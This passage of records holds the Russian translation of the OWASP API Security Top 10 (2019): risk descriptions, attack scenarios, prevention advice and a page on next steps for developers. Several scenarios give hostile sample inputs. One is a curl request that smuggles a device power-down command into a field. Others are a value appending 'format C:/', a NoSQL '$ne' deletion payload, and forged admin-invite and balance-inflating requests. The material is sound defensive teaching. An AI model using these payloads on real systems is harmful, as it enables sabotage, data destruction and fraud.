завершения загрузки, API создает миниатюры изображения разного размера. Во время создания миниатюр приложение использует всю доступную память и перестает отвечать на запросы из-за большого размера загруженного изображения.\n\n### Сценарий #2\n\nРассмотрим приложение, отображающее список пользователей в пользовательском интерфейсе с ограничением `200` штук на страницу. Для получения списка пользователей приложение отправляет следующий запрос на сервер: `/api/users?page=1&size=200`. Злоумышленник увеличивает `size` до `200 000`, что приводит к проблемам производительности в базе данных. API перестает отвечать на запросы и больше не может обработать запросы текущего или любого другого клиента (отказ в обслуживании).\n\nАналогичный сценарий может быть использован для обнаружения ошибок переполнения буфера или целочисленного переполнения.\n\n## Как предотвратить\n\n* Docker легко позволяет ограничить [объем памяти][1], [процессорное время][2], [количество перезапусков][3],\n  [файловые дескрипторы и процессы][4].\n* Установите ограничение на частоту вызовов метода API одним клиентом в заданный промежуток времени.\n* Уведомите клиента, когда ограничение превышено, предоставив ему значение ограничения и время, когда ограничение будет сброшено.\n* Добавьте соответствующие проверки параметров строки запроса и тела запроса на стороне сервера, особенно важно контролировать количество записей, возвращаемых в запросе.\n* Определите и контролируйте максимальный размер данных, содержащихся во всех входных параметрах и полезных нагрузках, например, максимальную длину строки или максимальное количество элементов массива.\n\n## Ссылки\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Внешние\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:46.477224"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Некорректная Авторизация на Уровне Функций\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **2** : Сложность обнаружения **1** | Технические последствия **2** : Зависит от бизнеса |\n| Эксплуатация уязвимости предполагает, что злоумышленник может успешно отправить запросы в точки входа API, к которым у него не должно быть доступа. Эти точки входа могут быть доступны любому неаутентифицированному пользователю или аутентифицированному пользователю, не имеющему достаточных привилегий. Подобную ошибку легче обнаружить в API (по сравнению с традиционными приложениями), поскольку API более структурированы, а порядок доступа к определенным функциям более предсказуем (например, изменив метод HTTP запроса с GET на PUT, или изменив строку “users” в URL запроса на \"admins\"). | Проверки авторизации к функции или ресурсу обычно определяются на уровне конфигурации, иногда на уровне кода. Проведение проверок надлежащим образом - непростая и неоднозначная задача, поскольку современные приложения могут использовать много типов ролей и групп, а также иметь сложную иерархию пользователей (например, под-пользователей или пользователей с несколькими ролями). | Подобные ошибки позволяют злоумышленнику получить доступ к функционалу, минуя авторизацию. Административный функционал - ключевая цель атак этого типа. |\n\n## Как определить, является ли API уязвимым?\n\nЛучший способ найти проблемы с некорректной авторизацией на уровне объектов - провести глубокий анализ механизма авторизации, учитывая иерархию пользователей, различные роли и группы внутри приложения, а также задав себе следующие вопросы:\n\n* Может ли обычный пользователь получить доступ к административным точкам входа?\n* Может ли пользователь совершить критичные действия (например, создать, изменить или удалить объект), к которым у него не должно быть доступа, просто изменив метод HTTP запроса (например, с `GET` на `DELETE`)?\n* Может ли пользователь из группы Х получить доступ к точке входа, доступной только пользователям из группы Y, просто угадав URL и параметры этой точки входа (например,  `/api/v1/users/export_all`)?\n\nНеверно предполагать, что точка входа API является обычной или административной только на основании пути URL.\n\nЗачастую разработчики открывают доступ к административным точкам входа по определенному относительному пути, например, `api/admins`. Однако очень часто административные точки входа находятся по другим относительным путям вместе с обычными точками входа, например, `api/users`.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nВ ходе процесса регистрации в приложении, которое позволяет регистрироваться только приглашенным пользователям, мобильное приложение отправляет следующий запрос к API `GET /api/invites/{invite_guid}`. Ответ содержит JSON с деталями приглашения, включая роль пользователя и его электронную почту.\n\nЗлоумышленник может дублировать запрос, изменив HTTP метод и точку входа на `POST /api/invites/new`. Только администраторы должны иметь доступ к этой точке входа через интерфейс администрирования, однако он не проводит проверки авторизации на уровне функций.\n\nПроэксплуатировав уязвимость, злоумышленник может отправить себе приглашение с ролью администратора:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Сценарий #2\n\nAPI содержит точку входа, которая должна быть доступна только администраторам `GET /api/admin/v1/users/all`. Эта точка входа возвращает данные всех пользователей и не проводит проверки авторизации на уровне функции. Злоумышленник, изучив структуру API, подбирает URL и получает доступ к точке входа, которая возвращает критичные данные пользователей приложения.\n\n## Как предотвратить\n\nВ вашем приложении должен быть согласованный и легко анализируемый модуль авторизации, вызываемый всеми бизнес функциями. Зачастую такая защита предоставляется одной или несколькими компонентами вне кода приложения.\n\n* Механизм, обеспечивающий выполнение проверок авторизации, должен запрещать весь доступ по умолчанию и требовать наличия определенных ролей для доступа к каждой из функций.\n* Проверьте все точки входа API на предмет некорректной авторизации на уровне функций, принимая во внимание бизнес логику приложения и иерархию групп.\n* Убедитесь, что все административные контроллеры наследуют абстрактный административный контроллер, в котором реализованы проверки авторизации на базе пользовательских групп и ролей.\n* Убедитесь, что административные функции внутри обычных контроллеров проводят проверки авторизации на базе пользовательских групп и ролей.\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Внешние\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:46.586781"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa6-mass-assignment.md", "content": "# API6:2019 - Массовое Переназначение Параметров (Mass assignment)\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **2** | Распространенность **2** : Сложность обнаружения **2** | Технические последствия **2** : Зависит от бизнеса |\n| Для эксплуатации зачастую требуется понимание бизнес логики, связей между объектами и структуры API. Эксплуатация массового переназначения параметров проще реализуема в API, поскольку они изначально предусматривают общедоступность внутренней реализации API и названий свойств объектов. | Современные фреймворки предлагают разработчикам функции, которые автоматически присваивают переменным и внутренним объектам значения соответствующих параметров из пользовательского ввода. Злоумышленник может использовать эту методологию, чтобы обновить или переназначить критичные свойства объектов, которые разработчик не намеревался делать доступными для пользователя. | Эксплуатация уязвимости может привести к повышению привилегий, злонамеренному изменению данных, обходу механизмов защиты и так далее. |\n\n## Как определить, является ли API уязвимым?\n\nОбъекты в современных приложениях могут иметь большое количество свойств. Некоторые из них могут быть изменены напрямую клиентом (например, `user.first_name` или `user.address`), в то время как изменение других не должно быть доступно (например, флаг `user.is_vip`).\n\nКонечная точка API уязвима, если она автоматически присваивает предоставленные клиентом параметры свойствам внутренних объектов, не учитывая критичность и уровень доступности этих свойств. Это может позволить злоумышленнику изменить свойства объектов, к которым у него не должно быть доступа.\n\nПримеры критичных свойств:\n\n* **Свойства, относящиеся к привилегиям**: `user.is_admin`, `user.is_vip` должны устанавливаться только администраторами.\n* **Свойства, зависящие от процесса**: `user.cash` должны устанавливаться только внутри кода после проверки платежа.\n* **Внутренние свойства**: `article.created_time` должны устанавливаться только внутри кода самим приложением.\n\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nПриложение для совместных поездок позволяет пользователю редактировать базовую информацию своего профиля. В ходе редактирования отправляется следующий запрос `PUT /api/v1/users/me` с корректным JSON объектом в теле запроса:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nЗапрос к `GET /api/v1/users/me` включает в себя дополнительное свойство credit_balance:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nЗлоумышленник дублирует первый запрос со следующим телом запроса:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nПоскольку точка входа уязвима к массовому переназначению параметров, злоумышленник зачисляет деньги на свой баланс, не совершив платежа.\n\n### Сценарий #2\n\nПортал для обмена видео позволяет пользователям загружать и скачивать материалы в разных форматах. Злоумышленник исследует API и обнаруживает, что точка входа `GET /api/v1/videos/{video_id}/meta_data` возвращает JSON объект с параметрами видео. Один из параметров `\"mp4_conversion_params\":\"-v codec h264\"` дает понять, что приложение использует консольную команду для конвертации видео.\n\nЗлоумышленник также обнаружил, что точка входа `POST /api/v1/videos/new` уязвима к массовому переназначению параметров и позволяет клиенту установить значение любого свойства объекта видео.\nЗлоумышленник устанавливает следующее значение параметра: `\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Это значение приведет к инъекции команды операционной системы, как только злоумышленник скачает видео в формате MP4.\n\n## Как предотвратить\n\n* Если возможно, избегайте использования функций, которые автоматически присваивают переменным и внутренним объектам соответствующие значения из пользовательского ввода.\n* Добавляйте в белые списки только те свойства, которые могут быть изменены клиентом.\n* Используйте встроенный функционал по добавлению в черный список свойств, к которым клиенты не могут иметь доступ.\n* Если это возможно, явно определите схемы входящих данных и проверяйте входящие данные по ним.\n\n## Ссылки\n\n### Внешние\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:46.703873"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa7-security-misconfiguration.md", "content": "# API7:2019 Ошибки Настроек Безопасности\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **3** : Сложность обнаружения **3** | Технические последствия **2** : Зависит от бизнеса |\n| Злоумышленники часто пытаются найти незакрытые уязвимости, распространенные точки входа или незащищенные файлы и папки, чтобы получить информацию о системе или неавторизованный доступ к ней. | Ошибка настроек безопасности может произойти на любом уровне API: от сетевого уровня до уровня приложения. Существуют автоматизированные инструменты для обнаружения и эксплуатации таких ошибок конфигурации, как ненужные (забытые) сервисы или использование устаревших параметров. | Ошибки настроек безопасности могут не только раскрыть конфиденциальные данные пользователей, но и данные о системе, что потенциально может привести к её полной компрометации. |\n\n## Как определить, является ли API уязвимым?\n\nAPI уязвим, если:\n\n* Должные настройки безопасности отсутствуют на каком-либо уровне приложения, а также если права доступа к облачным сервисам некорректно настроены.\n* Используется устаревшая система, или не установлены новейшие исправления по безопасности.\n* Активен излишний функционал (например, неиспользуемые HTTP методы).\n* Не используется протокол TLS (Transport Layer Security).\n* Директивы безопасности не отправляются клиентским приложениям (например, [Заголовки Безопасности][1]).\n* Политика разделения ресурсов между источниками (Cross-Origin Resource Sharing) отсутствует или некорректно настроена.\n* Сообщения об ошибках включают детальную информацию или раскрывают критичные данные.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nЗлоумышленник в корне директории сервера находит файл `.bash_history`, содержащий команды, которые использовала команда DevOps для доступа к API:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\n\nЗлоумышленник также может найти другие незадокументированные точки входа API, используемые только командой DevOps.\n\n### Сценарий #2\n\nДля атаки на конкретный сервис злоумышленник использует популярный поисковик, чтобы найти компьютеры, напрямую доступные из сети Интернет. Злоумышленник находит сервер, на котором запущена популярная система управления базой данных, доступная на стандартном порте. На сервере используется стандартная конфигурация, не предполагающая аутентификации, что позволяет злоумышленнику получить доступ к миллионам записей с персональными данными, личными предпочтениями и аутентификационными данными.\n\n### Сценарий #3\n\nАнализируя трафик мобильного приложения, злоумышленник обнаруживает, что не весь HTTP трафик защищен (например, с помощью TLS). В частности, не защищено скачивание изображений профиля. Поскольку взаимодействие пользователя с приложением бинарно (да или нет, свайп влево или вправо, и так далее), несмотря на шифрование трафика, злоумышленник может найти закономерности в параметрах ответов API (например, размер ответа на свайп влево больше, чем на свайп вправо), которые он в свою очередь может использовать для отслеживания действий и предпочтений пользователя.\n\n## Как предотвратить\n\nЖизненный цикл API должен включать в себя:\n\n* Повторяемый процесс усиления настроек безопасности, ведущий к более быстрому и простому развертыванию должным образом защищенного окружения.\n* Задачу по обзору и обновлению конфигурации на всех уровнях API. Обзор должен включать в себя файлы оркестрации, компоненты API и облачных сервисов (например, права доступа в S3 bucket).\n* Защищенный канал связи при доступе к статическим ресурсам.\n* Автоматизированный процесс, проводящий постоянную оценку эффективности настроек и параметров во всех окружениях.\n\nКроме того:\n\n* Для предотвращения отправки злоумышленникам подробных сообщений об ошибках и другой критичной информации, если это возможно, определите схемы данных всех ответов API и обеспечьте проверку этих ответов по схемам, включая сообщения об ошибках.\n* Убедитесь, что API доступно только с использованием заданного списка HTTP методов. Любые другие методы HTTP должны быть отключены (например, `HEAD`).\n* API, клиентами которых подразумеваются браузерные клиентские приложения, должны иметь корректно настроенную политику разделения ресурсов между источниками (Cross-Origin Resource Sharing).\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Внешние\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:46.825475"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa8-injection.md", "content": "# API8:2019 Инъекции\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **2** : Сложность обнаружения **3** | Технические последствия **3** : Зависит от бизнеса |\n| Злоумышленник может отправить в API любые данные через любой доступный вектор инъекции (например, прямой ввод, параметры, интегрированные сервисы и так далее), предполагая, что они будут перенаправлены в интерпретатор. | Ошибки, приводящие к инъекциям, очень распространены и присущи SQL, LDAP и NoSQL запросам, командам на операционной системе, XML парсерам и ORM. Подобные ошибки легко обнаруживаются в ходе анализа исходного кода. Злоумышленники могут использовать сканеры и фаззеры. | Инъекции могут привести к разглашению или уничтожению данных, отказу в обслуживании или получению злоумышленником полного контроля на сервером. |\n\n## Как определить, является ли API уязвимым?\n\nAPI уязвим к инъекциям, если:\n\n* Данные, поступившие от пользователя, не валидируются, не фильтруются или не очищаются на стороне API.\n* Данные, поступившие от пользователя, конкатенируются или используются в неизменном виде в SQL/NoSQL/LDAP запросах, командах на операционной системе, XML парсерах, ORM (Object Relational Mapping) или ODM (Object Document Mapper).\n* Данные поступающие из внешних систем (например, интегрированных систем) не валидируются, не фильтруются или не очищаются на стороне API.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nПрошивка устройства контроля за детьми предоставляет точку входа `/api/CONFIG/restore`, которая ожидает запроса с multipart параметром appId. Используя декомпилятор, злоумышленник обнаруживает, что appId передается непосредственно в вызов команды на операционной системе без предварительной очистки:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nСледующая команда позволяет злоумышленнику отключить любое устройство с уязвимой прошивкой:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Сценарий #2\n\nРассмотрим приложение с базовым CRUD функционалом для операций с бронированиями. Злоумышленник обнаружил NoSQL инъекцию через параметр `bookingId` в запросе на удаление бронирования. Запрос выглядит следующим образом: `DELETE /api/bookings?bookingId=678`.\n\nСервер API обрабатывает запросы на удаление с помощью следующей функции:\n\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nЗлоумышленник перехватывает запрос и изменяет параметр `bookingId`, как продемонстрировано ниже. В этом случае злоумышленник может удалить бронирование, принадлежащее другому пользователю:\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Как предотвратить\n\nДля предотвращения инъекций необходимо отделять данные от команд и запросов.\n\n* Валидируйте данные, используя одну доверенную и активно поддерживаемую библиотеку.\n* Валидируйте, фильтруйте и очищайте все данные, получаемые от клиентов или интегрированных систем.\n* Специальные символы должны быть экранированы, используя синтаксис целевого интерпретатора.\n* Отдайте предпочтение безопасному API, предоставляющему параметризированный интерфейс.\n* Всегда ограничивайте количество возвращаемых записей, чтобы предотвратить массовую утечку данных в случае инъекции.\n* Валидируйте входящие данные с помощью надлежащих фильтров, допуская только подходящие значения каждого из входящих параметров.\n* Определите тип данных и строгую модель данных для всех строковых параметров.\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### Внешние\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:46.940144"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xa9-improper-assets-management.md", "content": "# API9:2019 Ненадлежащее Управление Активами\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **3** | Распространенность **3** : Сложность обнаружения **2** | Технические последствия **2** : Зависит от бизнеса |\n| Старые версии API обычно не содержат всех исправлений и могут быть с легкостью скомпрометированы без необходимости обходить новейшие механизмы безопасности, которые с высокой вероятностью используются для защиты последних версий API. | Устаревшая документация усложняет поиск и исправление уязвимостей. Отсутствие инвентаризации активов и стратегии вывода из эксплуатации приводит к функционированию необновленных систем, которые могут быть использованы для кражи критичных данных. При использования современных подходов типа микросервисов, которые позволяют легко разворачивать независимые приложения (например, облачные сервисы или kubernetes) хосты API (домены и серверы, на которых функционирует API) зачастую без необходимости доступны извне. | Злоумышленник может получить доступ к критичным данным или даже получить контроль над сервером через старую, необновленную версию API, использующую одну и ту же базу данных. |\n\n## Как определить, является ли API уязвимым?\n\nAPI может быть уязвимым, если:\n\n* Назначение API хоста неясно, а также нет четких ответов на следующие вопросы:\n    * В каком окружении запущен API (например, production, staging, test, development)?\n    * Каким должен быть сетевой доступ к API (например, общедоступным, внутренним, для партнеров)?\n    * Какая версия API запущена?\n    * Какие данные собираются и обрабатываются API (например, персональные данные)?\n    * Каков поток движения данных?\n* Документация отсутствует или не обновляется.\n* Отсутствует план вывода из эксплуатации предыдущих версий API.\n* Инвентаризация хостов не проводится, или ее результаты устарели.\n* Инвентаризация интегрированных внутренних или сторонних сервисов не проводится, или ее результаты устарели.\n* Старые или предыдущие версии API функционируют без обновлений.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nПосле переработки своих приложений локальный поисковый сервис оставил доступ к старой версии API (`api.someservice.com/v1`) без надлежащих мер защиты и с доступом к базе данных пользователей. Тестируя одну из последних выпущенных версий приложения, злоумышленник нашел адрес API (`api.someservice.com/v2`). Заменив `v2` на `v1` в URL, злоумышленник получил доступ к старому незащищенному API, предоставляющему доступ к персональным данным более 100 миллионов пользователей.\n\n### Сценарий #2\n\nСоциальная сеть внедрила механизм ограничения количества запросов, не позволяющий злоумышленнику подобрать токен для сброса пароля. Этот механизм не был внедрен непосредственно в код API, а использовался в качестве отдельного компонента между клиентом и официальным API (`www.socialnetwork.com`).\nИсследователь нашел бета версию API (`www.mbasic.beta.socialnetwork.com`), использующую тот же API, включая механизм сброса пароля, но без механизма ограничения количества запросов. Исследователь смог сбросить пароль любого пользователя, перебирая все возможные варианты кода из 6 цифр.\n\n## Как предотвратить\n\n* Проводите инвентаризацию хостов API и документируйте важные аспекты каждого из них: окружение (например, production, staging, test, development), каким должен быть сетевой доступ (например, общедоступным, внутренним, для партнеров) и версию API.\n* Проводите инвентаризацию интегрированных сервисов и документируйте важные аспекты каждого из них: роль в системе, какие данные участвуют в обмене (потоки данных), какая степень критичности этих данных.\n* Документируйте все аспекты API: аутентификацию, ошибки, перенаправления, ограничение количества запросов, политику разделения ресурсов между источниками (CORS) и точки входа, включая параметры, запросы и ответы.\n* Создавайте документацию автоматически, используя общедоступные стандарты. Включайте создание документации в CI/CD.\n* Предоставьте документацию тем, кто имеет право доступа к API.\n* Используйте внешние меры защиты, например, API security firewalls на всех доступных версиях API, а не только на текущей версии в production.\n* Избегайте использования данных с production системы в API на базе не production окружения. Если такого использования невозможно избежать, защищайте этот API аналогично используемым в production.\n* Когда новая версия API включает улучшения, связанные с безопасностью, проводите анализ рисков для принятия решения о действиях по снижению рисков в старых версиях, например, переносу улучшения в старые версии без нарушения совместимости, или отключению старой версии и переводу всех клиентов на новую.\n\n## Ссылки\n\n### Внешние\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:47.046052"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Недостаточное Логирование и Мониторинг\n\n| Источники угроз/Векторы атак | Недостатки безопасности | Последствия |\n| - | - | - |\n| Зависит от API : Сложность эксплуатации **2** | Распространенность **3** : Сложность обнаружения **1** | Технические последствия **2** : Зависит от бизнеса |\n| Злоумышленник пользуется отсутствием логирования и мониторинга для незаметной эксплуатации уязвимостей системы. | Отсутствующие или недостаточные логирование и мониторинг не позволяют отследить подозрительную активность и своевременно отреагировать на нее. | Без наблюдения за происходящей подозрительной активностью у злоумышленника есть достаточно времени для полной компрометации системы. |\n\n## Как определить, является ли API уязвимым?\n\nAPI уязвим, если:\n\n* Не пишутся логи, уровень логирования некорректно установлен, или сообщения в логах недостаточно детальны.\n* Не обеспечивается целостность логов (например, [Инъекция в логи][1]).\n* Логи не подвергаются постоянному мониторингу.\n* API не подвергается постоянному мониторингу.\n\n## Примеры сценариев атаки\n\n## Сценарий #1\n\nКлюч доступа к административному API утекли через общедоступный репозиторий. Владелец репозитория был уведомлен о потенциальной утечке по электронной почте, но отреагировал на инцидент более чем через 48 часов, в связи с чем утечка ключей могла привести к получению доступа к критичным данным. Из-за недостаточного логирования компания не в состоянии оценить, к каким данным злоумышленники смогли получить доступ.\n\n### Сценарий #2\n\nПлатформа обмена видео подверглась масштабной атаке по перебору учетных данных. Не смотря на логирование неуспешных попыток входа, уведомление об атаке не последовало в течение всего хода атаки. Логи были проанализированы и атака обнаружена только во время анализа обращения пользователя. Компании пришлось публично попросить пользователей сменить пароли и отправить отчет об атаке в регулирующие органы.\n\n## Как предотвратить\n\n* Логируйте все неудачные попытки входа, отказы в доступе и ошибки валидации входящих данных.\n* Логи должны быть представлены в формате, позволяющем обрабатывать их с помощью систем управления логами, и должны включать достаточное количество деталей, позволяющих идентифицировать злоумышленника.\n* Логи должны считаться критичными данными, а их целостность должна быть обеспечена при передаче и хранении.\n* Настройте систему мониторинга для постоянного контроля инфраструктуры, сети и функционирующих API.\n* Используйте систему управления информацией и событиями безопасности (SIEM), чтобы агрегировать и управлять логами всех компонентов на всех уровнях и хостах API.\n* Настройте персональные уведомления и панели управления для скорейшего обнаружения и реагирования на подозрительную активность.\n\n## Ссылки\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and Logging Verification Requirements][4]\n\n### Внешние\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:47.167081"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/ru/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/ru/0xb0-next-devs.md", "content": "# Дальнейшие шаги для разработчиков\n\nЗадача по созданию и поддержке ПО в безопасном состоянии, или исправлению уже существующего ПО может быть сложной. То же верно и для API.\n\nМы уверены, что обучение и осведомленность являются ключевыми факторами написания безопасного ПО. Все остальное, необходимое для достижения этой цели, зависит от **налаженного и повторяемого процесса безопасности и стандартных мер защиты**.\n\nOWASP включает большое количество бесплатных открытых ресурсов по безопасности с самого начала проекта. Пожалуйста ознакомьтесь со [страницей OWASP Projects][1], чтобы получить полный список доступных проектов.\n\n| | |\n|-|-|\n| **Обучение** | Вы можете начать изучать [материалы OWASP Education Project][2], в соответствии со своей профессией и интересами. Для получения практических знаний мы добавили **crAPI** - **C**ompletely **R**idiculous **API** в [наш план развития][3]. Тем временем вы можете попрактиковаться в безопасности веб приложений, используя [OWASP DevSlop Pixi Module][4] - уязвимое веб приложение с API сервисом, направленное на обучение пользователей тестированию современных веб приложений и API на предмет ошибок безопасности и написанию более безопасных API в будущем. Вы также можете принять участие в практических сессиях [конференции OWASP AppSec][5] или [присоединиться в вашему локальному отделению OWASP][6]. |\n| **Требования по безопасности** | Безопасность должна быть частью любого проекта с самого начала. На этапе сбора требований необходимо определить роль безопасности в проекте. OWASP рекомендует использовать [OWASP Application Security Verification Standard (ASVS)][7] в качестве руководства по постановке требований безопасности. Если вы пользуетесь услугами внешних разработчиков, рассмотрите проект [OWASP Secure Software Contract Annex][8] и адаптируйте его в соответствии с локальными законами и нормативными требованиями. |\n| **Безопасная архитектура** | Безопасность должна получить должное внимание на всех этапах проекта. [OWASP Prevention Cheat Sheets][9] - хорошая отправная точка по проектированию механизмов безопасности на этапе архитектуры приложения. Среди прочего вы можете ознакомиться с [REST Security Cheat Sheet][10] и [REST Assessment Cheat Sheet][11]. |\n| **Стандартные меры безопасности** | Внедрение стандартных мер безопасности снижает риск ошибок, связанных с безопасностью, в ходе написания логики приложения. Несмотря на то, что многие современные фреймворки включают в себя стандартные меры безопасности, [OWASP Proactive Controls][12] предоставляет хороший обзор мер безопасности, которые стоит включить в ваш проект. OWASP также предоставляет библиотеки и инструменты, которые могут вам пригодиться, например, механизмы валидации. |\n| **Жизненный цикл разработки безопасного ПО** | Вы можете использовать [OWASP Software Assurance Maturity Model (SAMM)][13] для улучшения процессов создания API. Несколько других проектов OWASP могут помочь вам на различных этапах разработки API, например, [OWASP Code Review Project][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: 